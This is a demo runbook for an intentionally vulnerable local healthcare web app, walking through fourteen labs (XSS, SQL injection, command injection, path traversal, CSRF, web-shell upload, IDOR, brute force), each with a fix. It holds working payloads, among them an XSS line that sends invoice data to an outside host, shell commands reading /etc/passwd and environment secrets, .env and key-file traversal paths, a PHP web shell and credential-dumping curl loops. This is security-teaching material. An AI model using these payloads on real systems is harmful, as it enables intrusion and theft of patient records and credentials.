# MediCare Pro — Attack Lab Runbook

**Target:** this repository running locally (`npm start` → `http://localhost:3000`).
**Everything below targets intentionally vulnerable labs.** Do not run any of it against
a system you do not own.

Verified against the current source tree on 2026-10-02, not copied from the README.

---

## ⚠ Read this before you demo: the SSTI lab is GONE

`SSTI-PRESENTATION-SCRIPT.md` documents Server-Side Template Injection in the Patient
Feedback page (`renderTemplate()`, `new Function`, `${7*7}` → `49`, RCE chain).
**That vulnerability is not in the current code.**

`api/feedback.js` builds the report as a plain array joined with `\n`:

```js
const report = [
  '=== Patient Feedback Report ===',
  `Comments: ${review.comments}`,   // string interpolation only — no evaluation
].join('\n');
```

There is a regression test that locks this in (`tests/feedback.test.js`: submit `${7*7}`,
assert the report contains the literal `${7*7}` and **not** `49`).

So on the Patient Feedback page today:

| Submit | You get back |
|---|---|
| `${7*7}` | `Comments: ${7*7}` (literal) |
| `${process.env.FIREBASE_SERVICE_ACCOUNT}` | literal text |

**Do not present Patient Feedback as exploitable.** If you need an RCE beat in the talk,
use **System Diagnostics** (#5) or **Lab Reports** (#6) — those are real.

Also note `/api/file?path=.env` (#6) returns your **real** `.env`, not the fake strings in
the `SIMULATED` map, because `api/file.js` reads the actual filesystem first and the static
block list in `server.js` is registered *after* the `/api/:route` handler. Rotate anything
real in `.env` before demoing on a shared box.

---

## Sidebar map (what to click, in order)

| Section | Menu label | File | Lab |
|---|---|---|---|
| — | (login page) | `index.html` | #7 credential leak |
| Patient Management | Patient Records | `pages/sql-injection.html` | #3 SQLi |
| Patient Management | Patient Verification | `pages/sql-blind.html` | #4 Blind SQLi |
| Patient Management | Patient Search | `pages/xss-reflected.html` | #1 Reflected XSS |
| Patient Management | Patient Notes | `pages/xss-stored.html` | #2 Stored XSS |
| Staff Portal | Staff Login | `pages/brute-force.html` | #8 Brute force + enumeration |
| Staff Portal | Profile Settings | `pages/csrf.html` | #9 CSRF + priv-esc |
| Staff Portal | Bed Management | `pages/bed-management.html` | (see #14 — checked, not exploitable) |
| Staff Portal | Billing Portal | `pages/billing-portal.html` | #12 IDOR |
| Staff Portal | Patient Feedback | `pages/feedback.html` | clean now (see above) |
| Administration | Lab Reports | `pages/file-inclusion.html` | #6 LFI / path traversal |
| Administration | System Diagnostics | `pages/command-execution.html` | #5 Command injection (real RCE) |
| Administration | Locations & Directions | `pages/locations.html` | not a lab |
| Administration | Documents | `pages/shell-upload.html` | #10 Unrestricted upload |

---

## Attack catalogue at a glance

| # | Attack | Page | Endpoint | Real or simulated | Login needed? |
|---|---|---|---|---|---|
| 1 | Reflected XSS | Patient Search | client-side `innerHTML` | Real sink | No |
| 2 | Stored XSS | Patient Notes | `POST /api/xss-stored` | Real sink | No |
| 3 | SQL Injection | Patient Records | `GET /api/sql?id=` | Simulated | No |
| 4 | Blind SQL Injection | Patient Verification | `GET /api/sql-blind?id=` | Simulated | No |
| 5 | OS Command Injection | System Diagnostics | `GET /api/execute?host=` | **Real RCE** | No |
| 6 | Path Traversal / Arbitrary File Read | Lab Reports | `GET /api/file?path=` | **Real** | No |
| 7 | Credential Disclosure (password reset) | login page | `POST /api/forgot-password` | **Real** | No |
| 8 | Brute Force + User Enumeration | Staff Login | `POST /api/login` | **Real** | No |
| 9 | CSRF (+ privilege escalation chain) | Profile Settings | `POST /api/csrf-update` | **Real** | No |
| 10 | Unrestricted File Upload (web shell) | Documents | `POST /api/upload` | Pattern real, storage simulated | No |
| 11 | Client-side Privilege Escalation | any page after login | `sessionStorage.mpro_user` | **Real (UI only)** | Yes (any role) |
| 12 | IDOR / Information Disclosure | Billing Portal | `GET /api/billing?id=` | **Real** | No |
| 13 | Missing Authentication (whole API) | any | all `/api/*` | **Real** | No |
| 14 | Missing Security Headers / No CSP | any lab | — | **Real** | No |
| — | Mass assignment via CSRF endpoint | Profile Settings | `POST /api/csrf-update` | **Checked — NOT exploitable** | — |

---

## 1. Reflected XSS — Patient Search (`pages/xss-reflected.html`)

**Where:** Sidebar → Patient Management → **Patient Search**.

**Why it's vulnerable:** `doSearch()` assigns the search box straight to `innerHTML`:

```js
const input = document.getElementById('searchInput').value;
reflected.innerHTML = input;   // intentional lab
```

The page also reads `?name=` from the URL on load and auto-searches, so a crafted link
fires without any user typing.

**Do it:**

1. Open the page. Type into **Search Patient Name**:
   ```
   <img src=x onerror=alert(document.domain)>
   ```
2. Click **Search**. The alert fires and `Showing results for: "…"` renders the payload.

**Or straight from the URL** (paste in the address bar — this is the phishing version of
the same bug):

```
http://localhost:3000/pages/xss-reflected.html?name=<img src=x onerror=alert(document.domain)>
```

Variants worth demoing:

```
?name=<script>alert('XSS')</script>
?name="><svg/onload=alert(1)>
```

Chain it into the CSRF endpoint (#9) — it trusts any origin, so XSS becomes account
modification with no CSRF form needed:

```html
<img src=x onerror=fetch('/api/csrf-update',{method:'POST',headers:{'Content-Type':'application/json'},body:'{"name":"hacked"}'})>
```

**Fix:** `reflected.textContent = input;` plus a CSP (`default-src 'self'; script-src 'self'`).

---

## 2. Stored XSS — Patient Notes (`pages/xss-stored.html`)

**Where:** Sidebar → Patient Management → **Patient Notes**.

**Why it's vulnerable:** `api/xss-stored.js` stores `content` raw (`content: content`) and
returns it unsanitized; the page renders the feed with `innerHTML`. No CSP header is sent
(the secure version is a commented-out line in the API).

**Do it:**

1. Fill **Patient ID** = `P-001`, **Note / Observation** = the payload below, submit.
2. Reload the page — it fires again for every viewer.

```
<b>probe</b>
```

Working alert payload:

```html
<img src=x onerror="document.title='XSS-'+document.cookie">
```

Steal-the-invoice chain (uses IDOR #12):

```html
<img src=x onerror="fetch('/api/billing?id=INV-2024-1107').then(r=>r.text()).then(t=>new Image().src='https://example.com/?d='+btoa(t))">
```

Open the same page in a second browser profile signed in as a different staff member to
prove it hits other users, not just you.

**Fix:** sanitize server-side *and* client-side (DOMPurify), store escaped text, add the CSP.

---

## 3. SQL Injection — Patient Records (`pages/sql-injection.html`)

**Where:** Sidebar → Patient Management → **Patient Records**.
**Endpoint:** `GET /api/sql?id=`

⚠ **Simulated.** `api/sql.js` builds a realistic-looking query string for display and then
pattern-matches your input in `simulateSQLExecution()`. No real database is touched. The
teaching point is the vulnerable pattern, which the response prints back to you:

```js
const query = `SELECT * FROM patients WHERE id = '${input}'`;
```

**Do it:** type into **Patient ID** and press the query button.

| Goal | Payload | Expected on screen |
|---|---|---|
| WHERE bypass / dump all | `' OR '1'='1` | all 5 patients, note: *"⚠ OR injection — WHERE clause bypassed, all rows returned!"* |
| UNION to `users` | `' UNION SELECT * FROM users --` | **`admin / admin123`, `doctor / password1`, `nurse / nurse123`, `radiologist / xray2024` in cleartext** |
| Comment truncation | `1'--` | *"⚠ Comment injection"* |
| Boolean false | `' AND 1=2` | zero rows |
| DDL | `1'; DROP TABLE patients; --` | *"💥 DDL injection detected!"* |
| Stacked query | `1; SELECT * FROM users` | *"⚠ Stacked query attempt detected"* |

The UNION row is the money shot — plaintext passwords for every account.

Say honestly in the talk: *"this endpoint simulates the response so the demo is safe and
repeatable; the bug being taught is the string concatenation."*

**Fix:** parameterized queries — `db.execute('… WHERE id = ?', [id])`.

---

## 4. Blind SQL Injection — Patient Verification (`pages/sql-blind.html`)

**Where:** Sidebar → Patient Management → **Patient Verification**.
**Endpoint:** `GET /api/sql-blind?id=`

Returns **only** `{ "exists": true|false }`. That is the lesson: no data comes back, so you
extract it one character at a time by watching the boolean flip.

**Do it (in the Patient ID box, or via curl):**

```bash
# baseline — exists: false
curl "http://localhost:3000/api/sql-blind?id=999"

# prove the oracle flips — exists: true
curl "http://localhost:3000/api/sql-blind?id=1' AND 1=1--"
curl "http://localhost:3000/api/sql-blind?id=1' AND 1=2--"    # exists: false

# step 1: password length is 8
curl "http://localhost:3000/api/sql-blind?id=1' AND LENGTH(password)=8--"

# step 2: extract character by character — a d m i n 1 2 3
curl "http://localhost:3000/api/sql-blind?id=1' AND SUBSTRING(password,1,1)='a'--"   # true
curl "http://localhost:3000/api/sql-blind?id=1' AND SUBSTRING(password,2,1)='d'--"   # true
curl "http://localhost:3000/api/sql-blind?id=1' AND SUBSTRING(password,3,1)='m'--"   # true
curl "http://localhost:3000/api/sql-blind?id=1' AND SUBSTRING(password,4,1)='i'--"   # true
curl "http://localhost:3000/api/sql-blind?id=1' AND SUBSTRING(password,5,1)='n'--"   # true
curl "http://localhost:3000/api/sql-blind?id=1' AND SUBSTRING(password,6,1)='1'--"   # true
curl "http://localhost:3000/api/sql-blind?id=1' AND SUBSTRING(password,7,1)='2'--"   # true
curl "http://localhost:3000/api/sql-blind?id=1' AND SUBSTRING(password,8,1)='3'--"   # true
```

→ `admin123`, recovered from a bare true/false. On screen that is a nice visual: the
**Verified / Not Found** chip flipping with every guess.

Other working conditions: `COUNT(*)`, `username`, and any `role='admin'`.

**Fix:** parameterization. Never infer secrets from booleans.

---

## 5. OS Command Injection — System Diagnostics (`pages/command-execution.html`)

**Where:** Sidebar → Administration → **System Diagnostics**.
**Endpoint:** `GET /api/execute?host=`

🔥 **This one is real RCE.** `api/execute.js` line 21:

```js
const output = execSync(`ping -c 2 -W 2 ${host} 2>&1`, { timeout: 10000, maxBuffer: 1<<20 });
```

No sanitization, no host allowlist. The page URL-encodes your input — which protects the
URL, not the shell.

**Do it:** type into **Host / IP to Ping**:

```
localhost;whoami          → root        (best first payload — proves code execution)
localhost;id              → uid=0(root) gid=0(root)
localhost;cat /etc/passwd → user list
localhost;env             → every environment variable name AND value
localhost;ls -la ~        → home directory
```

Note: `ping` may not exist in every sandbox. If the output only shows the error, switch to
`whoami` or `id` — they are always present.

Metacharacters that all work: `;` `&&` `|` `$()` backticks `>` `*`.

Error output is returned too (line 29), so even a failing command confirms execution.

**Fix:** drop `execSync`. If ping is genuinely needed, validate with `net.isIP()` or a
strict hostname regex and never build a shell string.

---

## 6. Path Traversal / Arbitrary File Read — Lab Reports (`pages/file-inclusion.html`)

**Where:** Sidebar → Administration → **Lab Reports**.
**Endpoint:** `GET /api/file?path=`

**Real.** `api/file.js` line 52 takes `?path=` straight into `fs.readFileSync` with no
containment check. The correct code is already written in the comment at lines 59–62 —
nobody applied it.

**Do it:** the page pre-fills `reports/lab-report.txt`. Load it, then escalate:

| Path | Result |
|---|---|
| `reports/lab-report.txt` | baseline, works |
| `../../../../etc/passwd` | real passwd file |
| `../../../../etc/hosts` | internal hostnames (`db.internal.medicare.ph`, `admin.internal…`) |
| `../../../../proc/version` | kernel version |
| `../server.js` | source-code disclosure |
| `../firestore.rules` | security-rules disclosure |
| `.env` | ⚠ **your real secrets**, not the fake ones |
| `service-account.json` | ⚠ Firebase admin key (if present) |
| `../../../../nonexistent/aaa/bbb` | error message echoes the resolved absolute path |

Good chained demo: read `firestore.rules` to map the rules, then `.env` for the credentials.

**Fix:** resolve against a fixed base directory and reject anything that escapes it.

---

## 7. Credential Disclosure via Password Reset — login page (`index.html`)

**Where:** the **login page**, *Forgot password?* link.

**The worst auth bug in the project.** In demo mode (`api/forgot-password.js` lines 111–117)
the endpoint returns the **plaintext password** for any seeded username:

```js
return res.status(200).json({
  success: true, mode: 'demo',
  demoEmail: account.email,
  demoPassword: account.password,
});
```

**Do it:**

1. Signed out, on the login page, click **Forgot password**.
2. Enter `admin` → the response shows `demoPassword: "admin123"`.

Repeat for any username — it is a complete credential dump in one request:

```bash
for u in admin doctor nurse radiologist labtech; do
  echo -n "$u -> "; curl -s -X POST http://localhost:3000/api/forgot-password \
    -H 'Content-Type: application/json' -d "{\"username\":\"$u\"}"; echo;
done
```

In Firebase mode it is still bad: line 96 returns the **real password-reset link** in the
HTTP body instead of emailing it, so anyone who can call the endpoint resets any account.

**Fix:** always return one neutral message regardless of whether the user exists; email the
link out-of-band; never return a credential or reset token in the response.

---

## 8. Brute Force + User Enumeration — Staff Login (`pages/brute-force.html`)

**Where:** Sidebar → Staff Portal → **Staff Login**.
**Endpoint:** `POST /api/login`

`api/login.js` line 40 returns **two different messages** depending on whether the username
exists — a textbook enumeration oracle:

```js
message: userExists ? 'Incorrect password. Please try again.' : 'User not found.'
```

**Do it:**

1. **Staff Username** = `admin`, wrong password → *"Incorrect password."* (user exists).
2. **Staff Username** = `nobody` → *"User not found."* (user does not).
3. No lockout, no CAPTCHA, no server-side rate limit. Build a wordlist and just log in.

Every seeded credential is weak and printed in the README:

| Username | Password | Role |
|---|---|---|
| `admin` | `admin123` | Administrator |
| `doctor` | `password1` | Physician |
| `nurse` | `nurse123` | Nurse |
| `radiologist` | `xray2024` | Radiologist |
| `labtech` | `lab2024` | Lab Technician |

Scripted version (cmd.exe, **not** PowerShell — `curl` is aliased to `Invoke-WebRequest`
there):

```cmd
for /L %i in (1,1,50) do @curl -s -X POST http://localhost:3000/api/login -H "Content-Type: application/json" -d "{\"username\":\"admin\",\"password\":\"guess%i\"}"
```

Contrast for the talk: `/api/chat` *does* implement a rate limit (20 msg/min). Rate limiting
is not optional.

**Fix:** identical responses for unknown-user and wrong-password; per-account lockout with
exponential backoff; MFA for admin/physician roles.

---

## 9. CSRF + Privilege Escalation chain — Profile Settings (`pages/csrf.html`)

**Where:** Sidebar → Staff Portal → **Profile Settings**.
**Endpoint:** `POST /api/csrf-update`

`api/csrf-update.js` has **no CSRF token, no Origin/Referer check,
`Access-Control-Allow-Origin: *`, and no re-authentication before a password change**
(its own comments, lines 20–41, confirm it is deliberate).

**Do it — Option A, from the page (simplest):**

1. Fill **Full Name**, **Email Address**, **Department**, and **New Password**.
2. Submit. The response echoes `updatedBy: <origin>` and
   *"⚠ CSRF: Request accepted from any origin without token verification!"*

**Do it — Option B, prove no attacker domain is needed.** Sign in as `admin`, stay on any
page, open DevTools console (F12) and paste:

```js
fetch('/api/csrf-update', {
  method: 'POST',
  headers: {'Content-Type':'application/json'},
  body: JSON.stringify({ name:'Attacker Was Here', password:'pwned123' })
}).then(r=>r.json()).then(console.log);
```

**Do it — Option C, real cross-site.** Save this as `attack.html` on your Desktop (Notepad →
Save As → *All Files*, filename `attack.html`), then open it while signed in:

```html
<form id="f" action="http://localhost:3000/api/csrf-update" method="POST"
      enctype="text/plain">
  <input name="x" value='{"name":"Hacked By CSRF","password":"pwned123","dept":"Administration"}'>
</form>
<script>document.getElementById('f').submit();</script>
```

`enctype="text/plain"` makes it a CORS-simple request, so the browser sends it
cross-origin with no preflight. Open the file with `file://` and it still fires.

**Privilege escalation note:** this endpoint only accepts `name`, `email`, `dept`, and
`password` — `role` is whitelisted out, so **mass assignment does not work here**. Say so if
asked; it is a fair defensive point, and #11 is the escalation path that does work.

This updates an in-memory `profileStore`: it resets on server restart and never touches
Firestore. Don't overpromise.

**Fix:** synchronizer CSRF token, `SameSite=Strict` session cookie, validate `Origin`, drop
the wildcard CORS.

---

## 10. Unrestricted File Upload / Web Shell — Documents (`pages/shell-upload.html`)

**Where:** Sidebar → Administration → **Documents**.
**Endpoint:** `POST /api/upload` (filename comes from the `X-Filename` header)

`api/upload.js` never validates the extension — the allowlist is written and then commented
out at lines 26–29 — and would store the file under a web-accessible path.

**Do it:**

1. Create a file `shell.php` on your Desktop:
   ```php
   <?php system($_GET["cmd"]); ?>
   ```
   (Notepad Save As → *All Files*, otherwise Windows appends `.txt`.)
2. On the Documents page, drag it into the upload zone.
3. The response panel shows:

```json
{ "success": true,
  "filename": "shell.php",
  "url": "/uploads/shell.php",
  "size": "0",
  "isExecutable": true,
  "warning": "⚠ SHELL UPLOADED! …",
  "shellExecUrl": "/uploads/shell.php?cmd=whoami",
  "serverPath": "/var/www/html/uploads/shell.php" }
```

Any of `php php5 phtml php3 asp aspx jsp cgi pl py rb sh bash` triggers `isExecutable`.

Direct, without the page:

```cmd
curl -X POST http://localhost:3000/api/upload ^
  -H "Content-Type: application/octet-stream" ^
  -H "X-Filename: shell.php" ^
  --data "<?php system($_GET[&quot;cmd&quot;]); ?>"
```

Two honest details for the Q&A:
- **No file is written to disk.** `/uploads/shell.php` returns **404** — the upload is
  simulated. Say "the pattern is real, the storage is simulated."
- The response leaks `serverPath` and the executable-extension list, neither of which any
  real server should return.

**Fix:** allowlist extensions **and** sniff MIME by content; store outside the web root under
a generated name; never execute user uploads.

---

## 11. Client-side Privilege Escalation — any page after login

**Where:** anywhere, once signed in. Open the sidebar footer — it renders the role straight
from `sessionStorage`:

```js
const userData = JSON.parse(sessionStorage.getItem('mpro_user') || '{…}');
```

**Do it:** sign in as the *lowest* role (`nurse / nurse123`), press F12, console:

```js
const u = JSON.parse(sessionStorage.getItem('mpro_user'));
u.role = 'Administrator';
sessionStorage.setItem('mpro_user', JSON.stringify(u));
location.reload();
```

The sidebar footer now reads **Administrator**. The role is a client-side label only — the
server never sees it, and it clears when you sign out.

**Be honest about scope:** this is UI spoofing, not server-side privilege escalation. It
matters because the UI is what staff trust to decide what a user can see. The *real*
escalation chains are #5 (RCE → read `FIREBASE_SERVICE_ACCOUNT` → full Admin SDK, bypassing
every Firestore rule) and #7 (get the admin password outright).

**Fix:** authorize every action server-side; never derive permissions from client storage.

---

## 12. IDOR / Information Disclosure — Billing Portal (`pages/billing-portal.html`)

**Where:** Sidebar → Staff Portal → **Billing Portal**.
**Endpoint:** `GET /api/billing?id=`

`api/billing.js` returns the **full record for any known invoice ID with no authentication
and no ownership check** (lines 66–67). The IDs are short and guessable.

**Do it:** type into **Invoice Number**:

| ID | What comes back |
|---|---|
| `INV-2024-0912` | routine endocrinology consult, ₱2,400.00 |
| `INV-2024-1043` | chest X-ray, ₱1,150.00 |
| `INV-2024-1107` | ⚠ *"CONFIDENTIAL — behavioral health record. Do not disclose without patient consent."* |
| `INV-2024-1152` | ⚠ oncology / chemotherapy cycle 3, ₱48,200.00, room 502, attending physician |

That is the impact worth landing: unauthenticated access to psychiatric and oncology
records. In a real deployment this is a reportable breach under RA 10173.

Same pattern on **Patient Feedback**: `GET /api/feedback?patientId=P-001` enumerates any
patient's reviews with no auth.

**Fix:** require auth; verify the requester's role and that the record belongs to a patient
they may view; return 404 (not 403) for others; audit-log every record view.

---

## 13. Missing Authentication — every endpoint

**The biggest structural finding.** `server.js` registers `app.all('/api/:route')` with
**no authentication or authorization middleware anywhere**. No session check, no token
verification, no role gate on any route.

So every attack above is reachable **signed out**, without ever touching the login page:

```cmd
for %r in (sql sql-blind execute file upload csrf-update xss-stored billing feedback chat drug-info) do @curl -s -o NUL -w "/api/%r -> %%{http_code}\n" http://localhost:3000/api/%r
```

None return 401 or 403. The "authenticated" lab pages are protected by nothing more than
client-side redirects in the frontend.

**Fix:** one auth middleware in front of `app.all('/api/:route')`, plus per-route role
checks. Never rely on the frontend redirect.

---

## 14. Missing Security Headers / No CSP

No `Content-Security-Policy`, `X-Frame-Options`, `X-Content-Type-Options`,
`Referrer-Policy`, or `Strict-Transport-Security` on any lab response. The CSP line in
`api/xss-stored.js` is present but commented out.

**Do it:** F12 → Network → click any `/api/xss-stored` request → **Response Headers**. Only
`Access-Control-Allow-Origin: *` and `Content-Type` are there.

Impact: no defense-in-depth against #1 and #2. Both XSS labs would be substantially
mitigated by `default-src 'self'; script-src 'self'`.

Note the positive controls that *are* there — good contrast material: `x-powered-by` is
disabled, `dotfiles: 'deny'` on the static server, and a block list for `/.env`,
`package.json`, `firestore.rules`, `Dockerfile`, `service-account.json` (registered too
late to stop `/api/file`, but the intent is right).

---

## Checked and NOT exploitable

**Mass assignment via the CSRF/profile endpoint.** `POST /api/csrf-update` accepts only
`name`, `email`, `dept`, `password`. Sending `"role":"Administrator"` is silently ignored —
it is field-whitelisted. Say this if someone asks how you tried to escalate: the design is
correct, the missing auth is not.

**Patient Feedback SSTI.** See the warning at the top of this document.

---

## Resetting between demos

| What | How |
|---|---|
| Feedback / notes / invoices / CSRF profile | in-memory — restart the server (`Ctrl+C`, `npm start`) |
| Bed Management demo data | `npm run reset:patients` (add `--prune` to also remove the injected records) |
| Stored XSS notes | restart the server |
| Uploaded "documents" | clear the browser's Firestore/localStorage entry for documents, then re-upload |

---

## Two-minute pre-flight

1. `curl http://localhost:3000/healthz` → `{"ok":true}`
2. System Diagnostics: `localhost;whoami` → `root`
3. Lab Reports: `../../../../etc/passwd` → file contents
4. Stored XSS: submit `<b>probe</b>` → it renders bold on reload
5. Staff Login: `admin` / wrong password → *"Incorrect password"*; `nobody` → *"User not found"*
6. Login page → Forgot password → `admin` → `demoPassword: "admin123"`
7. Screenshots of each output saved, in case the server dies mid-talk

---

## Attribution / honesty checklist for the talk

Say these out loud so nobody can call the demo fake:

- SQLi (#3, #4) — **simulated** responses; the bug taught is string concatenation.
- Upload (#10) — **no file written to disk**; `/uploads/shell.php` is a 404.
- Command injection (#5) and file read (#6) — **real**.
- Password reset (#7), CSRF (#9), IDOR (#12), missing auth (#13) — **real**.
- Privilege escalation (#11) — client-side UI spoofing only; the real escalation is the RCE
  chain in #5.
- SSTI on Patient Feedback — **fixed**, do not demo it.
